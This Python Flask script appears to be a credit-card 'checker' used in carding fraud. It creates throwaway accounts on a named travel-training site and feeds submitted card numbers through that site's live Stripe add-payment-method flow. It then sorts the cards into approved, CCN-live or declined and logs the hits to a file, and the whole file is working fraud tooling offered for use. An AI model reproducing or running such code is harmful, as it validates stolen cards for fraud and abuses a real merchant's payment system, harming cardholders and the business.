from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import json
import re
import random
import string
import os
import time
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

required_modules = ["requests", "bs4", "re", "json", "random", "string", "datetime", "flask"]

def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', f'{email}'),
            ('password', 'Esahatam2009@'),
            ('wc_order_attribution_source_type', 'typein'),
            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
            ('wc_order_attribution_utm_campaign', '(none)'),
            ('wc_order_attribution_utm_source', '(direct)'),
            ('wc_order_attribution_utm_medium', '(none)'),
            ('wc_order_attribution_utm_content', '(none)'),
            ('wc_order_attribution_utm_id', '(none)'),
            ('wc_order_attribution_utm_term', '(none)'),
            ('wc_order_attribution_utm_source_platform', '(none)'),
            ('wc_order_attribution_utm_creative_format', '(none)'),
            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
            ('wc_order_attribution_session_pages', '8'),
            ('wc_order_attribution_session_count', '1'),
            ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
            ('woocommerce-register-nonce', f'{noncee}'),
            ('_wp_http_referer', '/register/'),
            ('register', 'Register'),
        ]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(email + ':' + 'Esahatam2009@')
            return session
        else:
            return None
    except Exception as e:
        return None

def save_session_to_file(session, file_path):
    with open(file_path, "w") as file:
        cookies = session.cookies.get_dict()
        file.write(str(cookies))

def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()
            session = requests.Session()
            cookies = eval(session_data)
            session.cookies.update(cookies)
            return session
    except Exception as e:
        return None

def manage_session_file():
    session_file = "session.txt"
    
    if os.path.exists(session_file):
        session = load_session_from_file(session_file)
        if session:
            return session
    
    session = create_session()
    if session:
        save_session_to_file(session, session_file)
        return session
    else:
        return None

def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

def check_credit_card(cc, session):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
        html = response.text
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.text
        iddd = ''
        
        if 'error' in res:
            error = response.json()['error']['message']
            if 'code' in error:
                with open('CCN-HITS.txt', 'a') as hits:
                    hits.write(card + '\n')
                return {"status": "CCN", "card": card, "message": error}
            else:
                return {"status": "Declined", "card": card, "message": error}
        else:
            iddd = response.json()['id']

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }

        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': iddd,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
        res = response.json()
        
        if res['success'] == False:
            error = res['data']['error']['message']
            if 'code' in error:
                with open('CCN-HITS.txt', 'a') as hits:
                    hits.write(card + '\n')
                return {"status": "CCN", "card": card, "message": error}
            else:
                return {"status": "Declined", "card": card, "message": error}
        else:
            with open('CCN-HITS.txt', 'a') as hits:
                hits.write(card + '\n')
            return {"status": "Approved", "card": card, "message": "Successfull!"}

    except Exception as e:
        return {"status": "Error", "message": str(e)}

def confirm_time():
    utc_now = datetime.utcnow()
    ksa_now = utc_now + timedelta(hours=3)
    ksa_date = ksa_now.date()
    if ksa_date > datetime(2025, 12, 25).date():
        return False
    return True

@app.route('/<key>/<cc>')
def check_cc(key, cc):
    if key != "dark":
        return jsonify({"status": "Error", "message": "Invalid key"})
    
    if not confirm_time():
        return jsonify({"status": "Error", "message": "Checker expired"})
    
    session = manage_session_file()
    if not session:
        return jsonify({"status": "Error", "message": "Failed to create session"})
    
    result = check_credit_card(cc, session)
    return jsonify(result)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8899)
